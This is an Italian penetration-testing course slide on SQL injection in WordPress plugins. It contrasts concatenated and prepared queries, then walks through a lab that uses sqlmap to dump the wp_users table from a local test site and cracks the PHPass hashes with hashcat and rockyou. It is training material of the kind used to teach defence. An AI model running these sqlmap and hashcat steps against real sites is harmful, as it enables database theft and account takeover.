Capitolo 4: Exploitation

Slide 4.7: SQL Injection in WordPress
Teoria: SQLi nei Plugin

Il core di WordPress è relativamente sicuro contro SQLi grazie a $wpdb->prepare(). Ma i plugin spesso non lo usano correttamente.


Pattern vulnerabili comuni:

// VULNERABILE - concatenazione diretta $query = "SELECT * FROM users WHERE id=" . $_GET['id']; // SICURO - prepared statement $wpdb->prepare("SELECT * FROM users WHERE id=%d", $_GET['id']);

Obiettivi SQLi in WordPress:

  • Dump tabella wp_users (hash password)
  • Lettura wp_options (config, API keys)
  • Modifica dati (privilege escalation)
  • File read/write (se permissions OK)

Security Insight: Gli hash WordPress usano PHPass. Sono crackabili con hashcat ma richiedono tempo. Preferite altri vettori se disponibili.

Lab: SQLMap Automatico

Identificare endpoint vulnerabile:

# Parametro sospetto in un plugin http://vulnerable-wp.local/wp-admin/admin.php?page=plugin&id=1

Lanciare SQLMap:

┌──(kali㉿kali)-[~] └─$ sqlmap -u "http://vulnerable-wp.local/wp-admin/admin.php?page=plugin&id=1" --cookie="wordpress_logged_in=..." --dbs

Dump tabella utenti:

└─$ sqlmap -u "..." -D wordpress -T wp_users --dump +----+------------+------------------------------------+ | ID | user_login | user_pass | +----+------------+------------------------------------+ | 1 | admin | $P$B7.../... (PHPass hash) | | 2 | editor | $P$B9.../... | +----+------------+------------------------------------+

Crack con Hashcat:

└─$ hashcat -m 400 hashes.txt rockyou.txt
